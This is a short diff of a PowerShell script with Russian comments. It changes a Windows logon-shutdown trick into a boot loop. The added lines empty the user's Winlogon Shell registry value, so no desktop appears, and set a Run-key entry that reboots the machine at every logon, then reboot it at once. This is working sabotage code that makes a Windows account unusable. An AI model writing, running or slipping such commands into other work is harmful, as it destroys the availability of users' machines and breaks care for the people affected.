@@ -1,2 +1,6 @@
-Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "AutoShutdown" -Value "shutdown /s /t 0"
+# Очищаем Shell - после входа в систему не будет рабочего стола
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -Value ""
+
+# Добавляем автозапуск на мгновенный ребут
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "AutoReboot" -Value "shutdown /r /t 0"
 shutdown /r /t 0
